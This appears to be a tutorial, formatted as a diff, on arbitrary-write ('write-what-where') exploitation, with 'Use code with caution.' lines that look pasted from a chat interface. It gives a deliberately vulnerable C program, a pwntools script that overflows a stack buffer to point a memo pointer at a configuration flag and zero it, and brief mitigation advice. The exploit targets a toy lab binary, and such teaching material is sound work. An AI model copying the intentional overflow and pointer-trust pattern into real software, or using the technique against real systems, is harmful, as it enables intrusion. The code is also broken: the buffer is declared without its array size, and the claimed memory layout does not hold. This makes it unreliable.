@@ -1,1 +1,134 @@
+An Arbitrary Write (often called a Write-What-Where primitive) is a vulnerability that allows an attacker to write arbitrary data to an arbitrary memory address. While the ultimate goal of exploitation is usually Remote Code Execution (RCE), achieving a stable arbitrary write without immediately triggering a shell is often a critical intermediary step.
+In modern environments, you might use an arbitrary write without RCE to alter program state, bypass security logic, overwrite configuration parameters, or corrupt state flags without executing code.
 
+1. Common Mechanisms for Arbitrary Writes
+
+• Format String Write (%n): Using the %n family of specifiers to write the number of bytes printed to an address supplied on the stack.
+• Corrupted Pointer Overwrite: Exploiting a heap or stack vulnerability to overwrite a data pointer variable. When the program later tries to write data to that pointer (*ptr = value), it writes directly to your fake destination.
+
+2. The Vulnerable C Program (write_vuln.c)
+
+This binary implements a banking/payment gateway switch. It features full exploit mitigations (ASLR, NX, Canaries, and PIE are enabled). There is no shell or win() function in this binary. However, it contains a pointer overwrite bug.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+struct account_profile {
+    char *memo_ptr;         // Pointer to where the memo should be written
+    int is_admin_account;   // 0 = False, 1 = True
+    double balance;
+};
+
+struct global_config {
+    int debug_mode;
+    int enforcement_level;  // If 1, requires high-grade signatures
+};
+
+struct global_config config = {0, 1}; // Hardcoded secure configurations
+
+void transaction_panel() {
+    struct account_profile profile;
+    profile.is_admin_account = 0;
+    profile.balance = 100.00;
+    
+    // Default destination for the memo text is the profile struct itself
+    char local_memo_buffer = {0};
+    profile.memo_ptr = local_memo_buffer;
+
+    printf("[*] Configuration enforcement address: %p\n", (void*)&config.enforcement_level);
+    printf("[*] Current enforcement level value: %d\n", config.enforcement_level);
+
+    // VULNERABILITY 1: Overwriting past local_memo_buffer lets us overwrite profile.memo_ptr
+    printf("Enter transaction metadata: ");
+    read(0, local_memo_buffer, 128); // 32-byte buffer overflowing into adjacent variables
+
+    // VULNERABILITY 2: Arbitrary Write Primitive
+    // The program trustingly writes user data into whatever address profile.memo_ptr holds
+    printf("Enter memo message: ");
+    read(0, profile.memo_ptr, 4); 
+
+    // Logical evaluation based entirely on configuration variables
+    if (config.enforcement_level == 0) {
+        printf("[+] SECURITY BYPASS: Signature enforcement deactivated. Processing millions...\n");
+    } else {
+        printf("[*] Transaction securely routed under strict signature validation rules.\n");
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    transaction_panel();
+    return 0;
+}
+Use code with caution.
+
+Compilation (Full Mitigations)
+
+bash
+gcc -O0 -fstack-protector-all -pie -fPIE write_vuln.c -o write_vuln
+Use code with caution.
+
+3. Exploitation Concept: Modifying Non-Control Flow State
+
+Instead of attempting to hijack the Instruction Pointer (RIP), which is protected by the stack canary, we exploit this via a two-stage input delivery to achieve a targeted data-only state change:
+1. Input 1: Send 32 bytes of padding to fill local_memo_buffer, followed by the exact runtime memory address of config.enforcement_level (which the program conveniently leaks for us in this scenario). This overwrites profile.memo_ptr.
+2. Input 2: The program triggers the second read(), forcing it to write our next input directly into config.enforcement_level. We send a 4-byte null integer (0x00000000) to turn security constraints off completely.
+text
+       Top of Stack (Lower Memory Address)
+       +------------------------------------+
+
+       |  local_memo_buffer (32 bytes)      |  <-- Overflown with 'A's
+       +------------------------------------+
+
+       |  profile.memo_ptr (4/8 bytes)       |  <-- Overwritten with target config address
+       +------------------------------------+
+       
+       Later inside the code execution flow:
+       read(0, profile.memo_ptr, 4)  ==>  Writes directly into config memory location!
+Use code with caution.
+
+4. The Python Arbitrary Write Script (write_primitive.py)
+
+This script captures the leak dynamically, reorganizes the layout, and leverages the write-what-where primitive to cleanly manipulate the program state.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Context for 64-bit architecture
+context.update(arch='amd64', os='linux')
+io = process('./write_vuln')
+
+# 1. Parse the leaked runtime address of the target configuration property
+io.recvuntil(b"Configuration enforcement address: ")
+target_address = int(io.recvline().strip(), 16)
+log.success(f"Target memory address to modify (WHERE): {hex(target_address)}")
+
+# 2. Stage 1 Payload: Overwrite the target data pointer
+# Fill up the 32-byte local buffer and place our target address right behind it
+offset = 32
+stage_1_payload = b"A" * offset + p64(target_address)
+
+io.recvuntil(b"Enter transaction metadata: ")
+log.info("Overwriting memory destination tracking pointer...")
+io.send(stage_1_payload)
+
+# 3. Stage 2 Payload: Deliver the data to be written (WHAT)
+# We want to change the enforcement level to 0
+new_value = p32(0)
+
+io.recvuntil(b"Enter memo message: ")
+log.info(f"Injecting status manipulation value (0x00) directly into address: {hex(target_address)}")
+io.send(new_value)
+
+# 4. View the logical state bypass output
+output = io.recvall().decode()
+print(output)
+Use code with caution.
+
+5. Architectural Mitigations Against State Manipulation
+
+Defending applications against targeted arbitrary writes means preventing data layouts from turning into tracking arrays:
+• Use the const Qualifier: Any configuration data, security flags, or environment thresholds that must remain static after initialization should be declared as const. The compiler places const globals in the .rodata (Read-Only Data) segment, causing the operating system to immediately crash the process with a segmentation fault if an arbitrary write attempts to modify it.
+• Isolate Variables via Structures: Keep security-critical metrics physically isolated from variable user data blocks. Avoid allowing user structures to maintain raw, mutable pointers directly alongside unverified local buffers inside the same thread stack window.
